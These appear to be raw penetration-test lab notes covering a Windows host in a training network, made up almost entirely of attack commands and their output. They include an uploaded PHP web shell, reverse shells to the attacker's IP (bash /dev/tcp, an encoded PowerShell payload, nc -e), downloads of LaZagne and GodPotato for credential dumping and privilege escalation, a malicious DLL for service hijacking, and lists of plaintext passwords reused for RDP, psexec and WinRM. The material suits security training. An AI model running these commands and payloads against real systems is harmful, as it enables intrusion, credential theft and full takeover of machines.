x86_64-w64-mingw32-gcc myDLL.cpp --shared -o BetaLibrary.Dll
python3 -m http.server 5555
iwr -uri http://192.168.45.170:5555/BetaLibrary.Dll -Outfile BetaLibrary.Dll

C:\Windows\system32
Restart-Service BetaMonitor


xfreerdp /u:emma /p:'SomersetVinyl1!' /v:192.168.200.248 
PowerShell > Run as Administrator > Mark > !8@aBRBYdb3!

PS C:\Users> cd mark
PS C:\Users\mark> cd Desktop
PS C:\Users\mark\Desktop> ls
    Directory: C:\Users\mark\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/26/2024   4:51 PM             34 proof.txt

PS C:\Users\mark\Desktop> type proof.txt
75f5216defe6beffeeddc59056d64bba


				CHECK FOR INTERNAL NETWORK: 
xfreerdp /u:mark /p:'!8@aBRBYdb3!' /v:192.168.200.248 

PS C:\Users\mark> ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : EXTERNAL
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-05-29
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.238.248(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.238.254
   DNS Servers . . . . . . . . . . . : 192.168.238.254
   NetBIOS over Tcpip. . . . . . . . : Enabled

PS C:\Users\mark> route print
===========================================================================
Interface List
  4...00 50 56 ab 05 29 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.238.254  192.168.238.248     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.238.0    255.255.255.0         On-link   192.168.238.248    271
  192.168.238.248  255.255.255.255         On-link   192.168.238.248    271
  192.168.238.255  255.255.255.255         On-link   192.168.238.248    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.238.248    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.238.248    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.238.254       1
===========================================================================
IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

PS C:\Users\mark> arp -A
Interface: 192.168.238.248 --- 0x4
  Internet Address      Physical Address      Type
  192.168.238.254       00-50-56-ab-80-2c     dynamic
  192.168.238.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static

--------------------------------------------------------------------------------------------------
				5. 192.168.238.249 (Pwn3d!)✅
RDP:3389, 
HTTP:80 8000 47001, 5985
SMB:139,445, 
RPC:135, 

Web frameworks
- Microsoft ASP.NET
Web servers
- IIS 10.0
Operating systems
- Windows Server

nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.238.249

HTTP: 80 5985 8000 47001
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          syn-ack Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.238.249:8000/dashboard/
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

SMB:
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
| smb2-time: 
|   date: 2024-04-28T01:16:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 57010/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 62040/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 10677/udp): CLEAN (Timeout)
|   Check 4 (port 28463/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

RDP: 3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2024-04-28T01:16:40+00:00
|_ssl-date: 2024-04-28T01:16:48+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=LEGACY
| Issuer: commonName=LEGACY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-29T19:20:08
| Not valid after:  2024-09-28T19:20:08
| MD5:   37cc:5dc1:42dc:3db5:af2e:a5b1:22d6:7f6e
| SHA-1: 22c7:2202:888b:9126:9f8a:da50:a86b:468d:ebdd:2f38
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQYJ7SeOenX45Md2MJoh2L7jANBgkqhkiG9w0BAQsFADAR
| MQ8wDQYDVQQDEwZMRUdBQ1kwHhcNMjQwMzI5MTkyMDA4WhcNMjQwOTI4MTkyMDA4
| WjARMQ8wDQYDVQQDEwZMRUdBQ1kwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCiXug6pNyeUi3PKGj5pud+WRg70sVILuvD9YxUcg1bgq4dKy7kbGrzCNFA
| gE9gZQNDrcvQOUYZYLAQrdyJ0bOlTyrPYTkqP8ETg2LrVLnFmUZnILGHgeQ1OS5e
| jjyG46v2P1EZfSOPIjEs9AJOeLA7wT/G15i234pX8XRNPfBTsxrNNagtvndvTTuG
| RcVo3ZWZmYuaaUVfjRTYcugXuoG9HKYWIMNqzPhwbUwYjptmASl3m6hOjXZD4PzU
| E85QY7ukj4PB00LAFS9noXmwTP9umnX+g8SbCU/5xU7VtDDj6cvuWPlcWPzQEfWv
| M97jT8CPmuzRUkbW1enSmgAUkcGlAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAXLLc8AXkJp5NYV1+
| GCVr/4wPWPO6548rJaW0vmh/uH5lXPoVatket639Dajs8eMi1S8yWDS/ctPTqV4z
| AHIGrPq+drWVyJ7obx3VdAoaGhmCKauqQaRkaQ9xvEE5pRRg3E8W4/8wODZ2d2w/
| mD+fD9lgceSJ6lzlgFmc3brU/ngk5xbU9ukfEZ5zHr16MxwY0NhE/aRDLr+l4C3c
| dNNQU2OH9zABEFGXdu8cU3Hk0KYK9S+s++08T6VwLJZF+WMFawZ78nZnEtXPrBYP
| 8nVZcwzVWNtP/A0PbFpd2dZXfEbzJvh0z7jskxjAcV+Y6bgRZMMMvxn/7MqD1FD5
| S8trNg==
|_-----END CERTIFICATE-----

RPC: 
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC


			RDP: 3389/tcp
xfreerdp /u:mark /p:'!8@aBRBYdb3!' /v:192.168.238.249
xfreerdp /u:emma /p:'SomersetVinyl1!' /v:192.168.238.249

			SMB:
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 192.168.238.249
smbclient -L \\\\192.168.238.249\\

OathDeeplyReprieve91
fireball
password
mark:!8@aBRBYdb3!
emma:SomersetVinyl1!
HabitsAgesEnd123
sa:SAPassword_1998
welcome1
bo:Luigi=Papal1963
Michael321:12345
DotNetNukeDatabasePassword!

smbclient \\\\192.168.238.249\\SHARE

enum4linux -n 192.168.238.249
enum4linux -a 192.168.238.249
smbmap -H 192.168.238.249
smbclient //192.168.238.249/IPC$ -N

impacket-psexec mark:'!8@aBRBYdb3!'@192.168.238.249 cmd.exe
impacket-psexec emma:'SomersetVinyl1!'@192.168.238.249 cmd.exe

impacket-wmiexec LEGACY/mark:'!8@aBRBYdb3!'@192.168.238.249
impacket-wmiexec LEGACY/emma:'SomersetVinyl1!'@192.168.238.249

			RPC: 
rpcclient -U "" 192.168.238.249
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

evil-winrm -i 192.168.238.249 -u mark -p '!8@aBRBYdb3!' 
evil-winrm -i 192.168.238.249 -u emma -p 'SomersetVinyl1!' 


			HTTP: 80 5985 8000 47001
			80: Microsoft-IIS/10.0
http://192.168.238.249/

			5985: Microsoft HTTPAPI httpd 2.0
http://192.168.238.249:5985/
Not Found
HTTP Error 404. The requested resource is not found.

			47001: Microsoft HTTPAPI httpd 2.0
http://192.168.238.249:47001/
Not Found
HTTP Error 404. The requested resource is not found.

			8000: Apache/2.4.54 
http://192.168.238.249:8000/dashboard/phpinfo.php
allow_url_fopen		On	On
allow_url_include	Off	Off
disable_classes		No Value
http://192.168.238.249:8000/phpmyadmin/
Forbidden

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.238.249:8000/ -w /usr/share/wordlists/dirb/common.txt
/.htaccess            (Status: 403) [Size: 307]
/.hta                 (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/aux                  (Status: 403) [Size: 307]
/cgi-bin/             (Status: 403) [Size: 307]
/CMS                  (Status: 301) [Size: 348] [--> http://192.168.238.249:8000/CMS/]
/cms                  (Status: 301) [Size: 348] [--> http://192.168.238.249:8000/cms/]
/com1                 (Status: 403) [Size: 307]
/com3                 (Status: 403) [Size: 307]
/com2                 (Status: 403) [Size: 307]
/con                  (Status: 403) [Size: 307]
/dashboard            (Status: 301) [Size: 354] [--> http://192.168.238.249:8000/dashboard/]
/favicon.ico          (Status: 200) [Size: 30894]
/img                  (Status: 301) [Size: 348] [--> http://192.168.238.249:8000/img/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.238.249:8000/dashboard/]
/licenses             (Status: 403) [Size: 426]
/lpt2                 (Status: 403) [Size: 307]
/lpt1                 (Status: 403) [Size: 307]
/examples             (Status: 503) [Size: 407]
/nul                  (Status: 403) [Size: 307]
/phpmyadmin           (Status: 403) [Size: 426]
/prn                  (Status: 403) [Size: 307]
/server-info          (Status: 403) [Size: 426]
/server-status        (Status: 403) [Size: 426]
/webalizer            (Status: 403) [Size: 426]


http://192.168.238.249:8000/CMS/
DEPRECATED - WE ARE CURRENTLY TRANSFERING THE DATA TO OUR NEW DEMO WEB APPLICATION.

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.238.249:8000/cms/ -w /usr/share/wordlists/dirb/big.txt
Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.238.249:8000/cms/a198f748-347c-4325-906b-cc91470d6638 => 302 (Length: 0). To continue please exclude the status code or the length

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.238.249:8000/cms/ -w /usr/share/wordlists/dirb/big.txt -b 302
/.htpasswd            (Status: 403) [Size: 307]
/.htaccess            (Status: 403) [Size: 307]
/CMS                  (Status: 301) [Size: 352] [--> http://192.168.238.249:8000/cms/CMS/]
/Media                (Status: 301) [Size: 354] [--> http://192.168.238.249:8000/cms/Media/]
/aux                  (Status: 403) [Size: 307]
/cms                  (Status: 301) [Size: 352] [--> http://192.168.238.249:8000/cms/cms/]
/com1                 (Status: 403) [Size: 307]
/com4                 (Status: 403) [Size: 307]
/com3                 (Status: 403) [Size: 307]
/com2                 (Status: 403) [Size: 307]
/con                  (Status: 403) [Size: 307]
/data                 (Status: 403) [Size: 307]
/files                (Status: 301) [Size: 354] [--> http://192.168.238.249:8000/cms/files/]
/lpt2                 (Status: 403) [Size: 307]
/lpt1                 (Status: 403) [Size: 307]
/media                (Status: 301) [Size: 354] [--> http://192.168.238.249:8000/cms/media/]
/nul                  (Status: 403) [Size: 307]
/prn                  (Status: 403) [Size: 307]
/secci                (Status: 403) [Size: 307]
/templates            (Status: 301) [Size: 358] [--> http://192.168.238.249:8000/cms/templates/]

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.238.249:8000/cms/ -w /usr/share/wordlists/dirb/big.txt -b 302 -x php
/admin.php            (Status: 200) [Size: 1117]
/ADMIN.php            (Status: 200) [Size: 1117]
/Admin.php            (Status: 200) [Size: 1117]
/index.php            (Status: 200) [Size: 1462]
/Index.php            (Status: 200) [Size: 1462]


					LFI:
DEFAULT LOGINS: 
http://192.168.238.249:8000/cms/admin.php
admin:admin

FILE MANAGER: 
http://192.168.238.249:8000/cms/admin.php?mode=filemanager
http://192.168.238.249:8000/cms/admin.php?mode=pages
http://192.168.238.249:8000/cms/admin.php?pages

UPLOAD FILE: 
http://192.168.238.249:8000/cms/admin.php?mode=filemanager&directory=files
Directory: files
shelly.pHp
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
nano cmdshell.pHp
<?php echo system($_GET['cmd']); ?>


				REVERSE SHELL: Local.txt
				https://www.revshells.com/
				https://www.urlencoder.org/
1st ATTEMPT: Crashed
nc -nvlp 4444
curl http://192.168.238.249:8000/cms/files/shelly.pHp
listening on [any] 4444 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.238.249] 57996
'uname' is not recognized as an internal or external command,
operable program or batch file.

2nd ATTEMPT: WORKED                                   
nano cmdshell.pHp
<?php echo system($_GET['cmd']); ?>
http://192.168.238.249:8000/cms/admin.php?mode=filemanager&directory=files
curl http://192.168.238.249:8000/cms/files/cmdshell.pHp?cmd=whoami
legacy\adrian
legacy\adrian   

1st ATTEMPT: CMD BASH SHELL: DIDNT WORK
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
curl http://192.168.238.249:8000/cms/files/cmdshell.pHp?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.170%2F4444%200%3E%261%22
curl http://192.168.238.249:8000/cms/files/cmdshell.pHp?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.170%2F4444%200%3E%261%22

2nd ATTEMPT: CMD BASH SHELL: DIDNT WORK
sh -i >& /dev/tcp/192.168.45.170/4444 0>&1
curl http://192.168.238.249:8000/cms/files/cmdshell.pHp?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.170%2F4444%200%3E%261

3rd ATTEMPT: CMD POWERSHELL SHELL: WORKED: 
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://192.168.238.249:8000/cms/files/cmdshell.pHp?cmd=whoami%20/priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

curl http://192.168.238.249:8000/cms/files/cmdshell.pHp?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.238.249] 58022
whoami
legacy\adrian

PS C:\xampp\htdocs\cms\files> hostname 
LEGACY

PS C:\xampp\htdocs\cms\files> cd C:\Users
PS C:\Users> cd adrian
PS C:\Users\adrian> cd Desktop
PS C:\Users\adrian\Desktop> cat local.txt
aef696e0edf956056fd011916e9aade9

				DUMP CREDS:
PS C:\Users\adrian\Documents> certutil.exe -urlcache -split -f "http://192.168.45.170:5555/LaZagne.exe" laz.exe
PS C:\Users\adrian\Documents> .\laz.exe all
[+] 0 passwords have been found.



				Priv Esc: Administrator
PS C:\Users\adrian\Downloads> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


SeImpersonatePrivilege: GodPotato
https://github.com/BeichenDream/GodPotato
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer

python3 -m http.server 5555
PS C:\Users\adrian\Downloads> iwr -uri http://192.168.45.170:5555/nc64.exe -Outfile nc64.exe
PS C:\Users\adrian\Downloads> iwr -uri http://192.168.45.170:5555/GodPotato-NET4.exe -Outfile GodPotato.exe
PS C:\Users\adrian\Downloads> .\GodPotato.exe -cmd "cmd /c whoami"
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE

nc -nvlp 2560 
PS C:\Users\Public> .\GodPotato.exe -cmd "C:\Users\adrian\Downloads\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.170 2560"

nc -nvlp 2560 
connect to [192.168.45.170] from (UNKNOWN) [192.168.238.249] 58061
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

CANT EXECUTE MOST COMMANDS
C:\Windows\system32>whoami
whoami

C:\Windows\system32>powershell -ep bypass
powershell -ep bypass

C:\Windows\system32>whoami /priv
whoami /priv


C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 12DF-ECB8
 Directory of C:\
10/11/2022  01:08 AM    <DIR>          inetpub
04/27/2024  06:12 PM             2,665 output.txt
05/08/2021  01:20 AM    <DIR>          PerfLogs
10/11/2022  04:08 AM    <DIR>          Program Files
10/11/2022  04:08 AM    <DIR>          Program Files (x86)
10/20/2022  02:01 AM    <DIR>          staging
10/20/2022  01:49 AM    <DIR>          Users
10/20/2022  02:14 AM    <DIR>          Windows
10/20/2022  01:37 AM    <DIR>          xampp


C:\>cd Users
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 12DF-ECB8
 Directory of C:\Users
10/20/2022  01:49 AM    <DIR>          .
02/28/2023  02:27 PM    <DIR>          Administrator
10/20/2022  01:45 AM    <DIR>          adrian
10/20/2022  02:08 AM    <DIR>          damon
10/10/2022  08:52 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  10,532,327,424 bytes free


C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 12DF-ECB8
 Directory of C:\Users\Administrator\Desktop
10/10/2022  08:52 AM    <DIR>          .
02/28/2023  02:27 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  10,532,327,424 bytes free


C:\Users\damon>dir
 Volume in drive C has no label.
 Volume Serial Number is 12DF-ECB8
 Directory of C:\Users\damon
10/20/2022  02:08 AM    <DIR>          .
10/20/2022  01:49 AM    <DIR>          ..
10/20/2022  02:22 AM                 0 .bash_history
10/20/2022  02:06 AM                69 .gitconfig
10/20/2022  02:07 AM                20 .lesshst
10/20/2022  01:49 AM    <DIR>          3D Objects
10/20/2022  01:49 AM    <DIR>          Contacts
11/16/2022  05:47 AM    <DIR>          Desktop
10/20/2022  01:49 AM    <DIR>          Documents
10/20/2022  01:49 AM    <DIR>          Downloads
10/20/2022  01:49 AM    <DIR>          Favorites
10/20/2022  01:49 AM    <DIR>          Links
10/20/2022  01:49 AM    <DIR>          Music
10/20/2022  01:49 AM    <DIR>          Pictures
10/20/2022  01:49 AM    <DIR>          Saved Games
10/20/2022  01:49 AM    <DIR>          Searches
10/20/2022  01:49 AM    <DIR>          Videos
               3 File(s)             89 bytes
              14 Dir(s)  10,532,327,424 bytes free


C:\Users\damon>type .bash_history
type .bash_history

C:\Users\damon>type .lesshst
type .lesshst
.less-history-file:

C:\Users\damon>cd Desktop
C:\Users\damon\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 12DF-ECB8
 Directory of C:\Users\damon\Desktop
04/27/2024  06:13 PM    <DIR>          .
10/20/2022  02:08 AM    <DIR>          ..
04/27/2024  06:13 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  10,532,327,424 bytes free

C:\Users\damon\Desktop>type proof.txt
type proof.txt
1b591329e7cb7759cdf65ca4bbf8a035

				CHECK FOR INTERNAL NETWORK: 

C:\Users\damon\Desktop>ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : LEGACY
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-54-C0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.238.249(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.238.254
   DNS Servers . . . . . . . . . . . : 192.168.238.254
   NetBIOS over Tcpip. . . . . . . . : Enabled

C:\Users\damon\Desktop>route print
===========================================================================
Interface List
  3...00 50 56 ab 54 c0 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.238.254  192.168.238.249     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.238.0    255.255.255.0         On-link   192.168.238.249    271
  192.168.238.249  255.255.255.255         On-link   192.168.238.249    271
  192.168.238.255  255.255.255.255         On-link   192.168.238.249    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.238.249    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.238.249    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.238.254       1
===========================================================================
IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

C:\Users\damon\Desktop>arp -A
arp -A
Interface: 192.168.238.249 --- 0x3
  Internet Address      Physical Address      Type
  192.168.238.254       00-50-56-ab-80-2c     dynamic   
  192.168.238.255       ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static   


				DUMP CREDS : 
CANT UPLOAD: 
iwr -uri http://192.168.45.170:5555/LaZagne.exe -Outfile laz.exe
certutil.exe -urlcache -split -f "http://192.168.45.170:5555/LaZagne.exe" laz.exe
.\laz.exe all

CANT EXECUTE FROM ADRIAN FOLDER: 
C:\Users\adrian\Documents>.\laz.exe all
[4432] Failed to execute script pyi_rth_pkgres
Traceback (most recent call last):
  File "site-packages\PyInstaller\loader\rthooks\pyi_rth_pkgres.py", line 13, in <module>
  File "c:\Python37\lib\site-packages\PyInstaller\loader\pyimod03_importers.py", line 623, in exec_module
  File "site-packages\pkg_resources\__init__.py", line 82, in <module>
  File "site-packages\pkg_resources\extern\__init__.py", line 52, in create_module
  File "site-packages\pkg_resources\extern\__init__.py", line 48, in load_module
ImportError: The 'platformdirs' package is required; normally this is bundled with this package so if you get this warning, consult the packager of your distribution.

				Powershell password hunting:
PS C:\> (Get-PSReadlineOption).HistorySavePath
C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\> type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
ipconfig
hostname
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s

CHECK RDP: DIDNT WORK
xfreerdp /u:Administrator /p:'password!' /v:192.168.238.249
xfreerdp /u:adrian /p:'password!' /v:192.168.238.249
xfreerdp /u:damon /p:'password!' /v:192.168.238.249
xfreerdp /u:Administrator /p:'i6yuT6tym@' /v:192.168.238.249
xfreerdp /u:adrian /p:'i6yuT6tym@' /v:192.168.238.249

RDP: WORKED: 
xfreerdp /u:damon /p:'i6yuT6tym@' /v:192.168.238.249
i6yuT6tym@
password!


				INSPECTING: .gitconfig
https://git-scm.com/docs/git-config
https://git-scm.com/book/en/v2/Getting-Started-First-Time-Git-Setup
https://stackoverflow.com/questions/50817139/how-to-show-hidden-files-dotfiles-with-windows-powershell
		

PS C:\Users\damon> Get-ChildItem -Path C:\ -Include *.gitconfig -File -Recurse -ErrorAction SilentlyContinue -Force
    Directory: C:\Users\damon
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/20/2022   2:06 AM             69 .gitconfig


PS C:\Users\damon>type .gitconfig
type .gitconfig
[safe]
        directory = C:/staging
[user]
        email = damian
        name = damian


PS C:\Users\Administrator> cd C:\staging
PS C:\staging> ls -Force
    Directory: C:\staging
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--h--        10/20/2022   2:07 AM                .git
d-----        10/20/2022   1:57 AM                htdocs


PS C:\staging\.git> ls -Force
    Directory: C:\staging\.git
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/20/2022   2:01 AM                hooks
d-----        10/20/2022   2:01 AM                info
d-----        10/20/2022   2:06 AM                logs
d-----        10/20/2022   2:07 AM                objects
d-----        10/20/2022   2:01 AM                refs
-a----        10/20/2022   2:07 AM             34 COMMIT_EDITMSG
